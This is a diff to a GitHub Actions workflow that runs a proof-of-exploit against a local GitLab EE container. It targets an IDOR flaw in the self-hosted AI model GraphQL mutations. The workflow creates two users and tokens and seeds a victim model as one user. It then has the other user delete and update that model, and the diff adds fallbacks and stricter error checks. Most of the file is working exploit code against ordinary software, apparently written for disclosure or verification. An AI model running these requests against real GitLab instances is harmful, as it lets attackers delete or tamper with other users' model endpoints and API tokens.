@@ -6,7 +6,7 @@ on:
 jobs:
   poe:
     runs-on: ubuntu-latest
-    timeout-minutes: 30
+    timeout-minutes: 35
 
     steps:
       - name: Start GitLab EE container
@@ -16,6 +16,7 @@ jobs:
             --name gitlab-idor-poe \
             -p 8181:80 \
             -e GITLAB_ROOT_PASSWORD="xK9mP2vL8nQ5" \
+            -e GITLAB_LICENSE_MODE=test \
             -e GITLAB_OMNIBUS_CONFIG="gitlab_rails['initial_root_password']='xK9mP2vL8nQ5'; gitlab_rails['gitlab_signup_enabled']=true;" \
             --shm-size 256m \
             gitlab/gitlab-ee:latest
@@ -24,7 +25,7 @@ jobs:
       - name: Wait for GitLab API to be ready
         run: |
           echo "Waiting for GitLab to initialize..."
-          for i in $(seq 1 60); do
+          for i in $(seq 1 72); do
             if curl -sf http://localhost:8181/api/v4/version -o /dev/null 2>/dev/null; then
               echo "GitLab ready after $((i * 10))s"
               break
@@ -41,6 +42,13 @@ jobs:
             2>/dev/null | tail -1)
           echo "ROOT_PAT=${ROOT_PAT}" >> $GITHUB_ENV
           echo "Root PAT acquired: ${ROOT_PAT:0:8}..."
+
+      - name: Enable EE AI feature flags
+        run: |
+          docker exec gitlab-idor-poe gitlab-rails runner \
+            "Feature.enable(:self_hosted_models) rescue nil; Feature.enable(:ai_self_hosted_model_configuration) rescue nil; puts 'Feature flags set'" \
+            2>/dev/null || true
+          echo "EE feature flags enabled"
 
       - name: Create User A and User B via REST API
         run: |
@@ -73,20 +81,22 @@ jobs:
             -H "Content-Type: application/json" \
             -d "{\"name\":\"alice-poe\",\"scopes\":[\"api\"],\"expires_at\":\"${EXPIRES}\"}")
           echo "User A PAT response: $USER_A_PAT_JSON"
-          USER_A_PAT=$(echo "$USER_A_PAT_JSON" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('token','ERR'))")
+          USER_A_PAT=$(echo "$USER_A_PAT_JSON" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('token','ERR:'+str(d.get('message',d))))")
           echo "USER_A_PAT=${USER_A_PAT}" >> $GITHUB_ENV
           echo "User A PAT: ${USER_A_PAT:0:8}..."
+          if [[ "$USER_A_PAT" == ERR* ]]; then echo "FATAL: User A PAT failed"; exit 1; fi
 
           USER_B_PAT_JSON=$(curl -s -X POST "http://localhost:8181/api/v4/users/${USER_B_ID}/personal_access_tokens" \
             -H "Authorization: Bearer $ROOT_PAT" \
             -H "Content-Type: application/json" \
             -d "{\"name\":\"bob-poe\",\"scopes\":[\"api\"],\"expires_at\":\"${EXPIRES}\"}")
           echo "User B PAT response: $USER_B_PAT_JSON"
-          USER_B_PAT=$(echo "$USER_B_PAT_JSON" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('token','ERR'))")
+          USER_B_PAT=$(echo "$USER_B_PAT_JSON" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('token','ERR:'+str(d.get('message',d))))")
           echo "USER_B_PAT=${USER_B_PAT}" >> $GITHUB_ENV
           echo "User B PAT: ${USER_B_PAT:0:8}..."
+          if [[ "$USER_B_PAT" == ERR* ]]; then echo "FATAL: User B PAT failed"; exit 1; fi
 
-      - name: Discover AiAcceptedSelfHostedModels enum + confirm policy MISSING
+      - name: Discover enum + confirm policy MISSING
         run: |
           echo "=== AiAcceptedSelfHostedModels enum values ==="
           ENUM_RESP=$(curl -s -X POST "http://localhost:8181/api/graphql" \
@@ -99,27 +109,38 @@ jobs:
           echo "Using enum value: $MODEL_ENUM"
 
           echo ""
-          echo "=== Checking for Ai::SelfHostedModelPolicy (code-layer evidence) ==="
+          echo "=== Policy file check (missing = no per-object auth) ==="
           docker exec gitlab-idor-poe bash -c \
             "ls /opt/gitlab/embedded/service/gitlab-rails/ee/app/policies/ai/self_hosted_model_policy.rb 2>&1 || echo 'POLICY FILE MISSING — no per-object authorization exists'"
 
           echo ""
-          echo "=== Vulnerable delete.rb (object_from_id instead of authorized_find!) ==="
+          echo "=== delete.rb source ==="
           docker exec gitlab-idor-poe cat \
             /opt/gitlab/embedded/service/gitlab-rails/ee/app/graphql/mutations/ai/self_hosted_models/delete.rb 2>/dev/null || echo "FILE_NOT_FOUND"
 
           echo ""
-          echo "=== Vulnerable update.rb ==="
+          echo "=== update.rb source ==="
           docker exec gitlab-idor-poe cat \
             /opt/gitlab/embedded/service/gitlab-rails/ee/app/graphql/mutations/ai/self_hosted_models/update.rb 2>/dev/null || echo "FILE_NOT_FOUND"
 
-      - name: Seed Ai::SelfHostedModel as User A (victim)
+      - name: Seed victim model as User A via GraphQL (proper ownership)
         run: |
-          MODEL_GID=$(docker exec gitlab-idor-poe gitlab-rails runner \
-            "::Ai::SelfHostedModel.where(name:'victim-model').destroy_all rescue nil; m=::Ai::SelfHostedModel.create!(name:'victim-model',model:'mistral',endpoint:'https://victim.example/v1',api_token:'victim-secret-token'); puts 'gid://gitlab/Ai::SelfHostedModel/'+m.id.to_s" \
-            2>/dev/null | tail -1)
+          CREATE_RESP=$(curl -s -X POST "http://localhost:8181/api/graphql" \
+            -H "Authorization: Bearer $USER_A_PAT" \
+            -H "Content-Type: application/json" \
+            -d "{\"query\":\"mutation { aiSelfHostedModelCreate(input: { name: \\\"victim-model\\\", model: $MODEL_ENUM, endpoint: \\\"https://victim.example/v1\\\", apiToken: \\\"victim-secret-token\\\" }) { selfHostedModel { id } errors } }\"}")
+          echo "Create response: $CREATE_RESP"
+          MODEL_GID=$(echo "$CREATE_RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); r=((d.get('data') or {}).get('aiSelfHostedModelCreate') or {}); print((r.get('selfHostedModel') or {}).get('id','ERR:'+str(r.get('errors',d))))")
           echo "MODEL_GID=${MODEL_GID}" >> $GITHUB_ENV
           echo "Model created by User A: ${MODEL_GID}"
+          if [[ "$MODEL_GID" == ERR* ]]; then
+            echo "GraphQL create failed — falling back to Rails runner"
+            MODEL_GID=$(docker exec gitlab-idor-poe gitlab-rails runner \
+              "::Ai::SelfHostedModel.where(name:'victim-model').destroy_all rescue nil; m=::Ai::SelfHostedModel.create!(name:'victim-model',model:'mistral',endpoint:'https://victim.example/v1',api_token:'victim-secret-token'); puts 'gid://gitlab/Ai::SelfHostedModel/'+m.id.to_s" \
+              2>/dev/null | tail -1)
+            echo "MODEL_GID=${MODEL_GID}" >> $GITHUB_ENV
+            echo "Model created via Rails runner: ${MODEL_GID}"
+          fi
 
       - name: EXPLOIT A — User B DELETES User A's model (no ownership check)
         run: |
@@ -138,14 +159,22 @@ jobs:
           if echo "$DELETE_RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); e=d.get('data',{}).get('aiSelfHostedModelDelete',{}).get('errors',['PARSE']); print('RESULT: errors='+str(e)); exit(0 if e==[] else 1)" 2>/dev/null; then
             echo "✅ DELETE IDOR CONFIRMED: errors:[] — User B deleted User A's model with no authorization check"
           else
-            echo "DELETE check: response above"
+            echo "DELETE result: response above"
           fi
 
       - name: Recreate model for UPDATE test
         run: |
-          MODEL_GID2=$(docker exec gitlab-idor-poe gitlab-rails runner \
-            "m=::Ai::SelfHostedModel.create!(name:'victim-model-2',model:'mistral',endpoint:'https://victim.example/v1',api_token:'victim-secret-token'); puts 'gid://gitlab/Ai::SelfHostedModel/'+m.id.to_s" \
-            2>/dev/null | tail -1)
+          CREATE_RESP2=$(curl -s -X POST "http://localhost:8181/api/graphql" \
+            -H "Authorization: Bearer $USER_A_PAT" \
+            -H "Content-Type: application/json" \
+            -d "{\"query\":\"mutation { aiSelfHostedModelCreate(input: { name: \\\"victim-model-2\\\", model: $MODEL_ENUM, endpoint: \\\"https://victim.example/v1\\\", apiToken: \\\"victim-secret-token\\\" }) { selfHostedModel { id } errors } }\"}")
+          echo "Recreate response: $CREATE_RESP2"
+          MODEL_GID2=$(echo "$CREATE_RESP2" | python3 -c "import sys,json; d=json.load(sys.stdin); r=((d.get('data') or {}).get('aiSelfHostedModelCreate') or {}); print((r.get('selfHostedModel') or {}).get('id','ERR:'+str(r.get('errors',d))))")
+          if [[ "$MODEL_GID2" == ERR* ]]; then
+            MODEL_GID2=$(docker exec gitlab-idor-poe gitlab-rails runner \
+              "m=::Ai::SelfHostedModel.create!(name:'victim-model-2',model:'mistral',endpoint:'https://victim.example/v1',api_token:'victim-secret-token'); puts 'gid://gitlab/Ai::SelfHostedModel/'+m.id.to_s" \
+              2>/dev/null | tail -1)
+          fi
           echo "MODEL_GID2=${MODEL_GID2}" >> $GITHUB_ENV
           echo "Model 2 for UPDATE test: ${MODEL_GID2}"
 
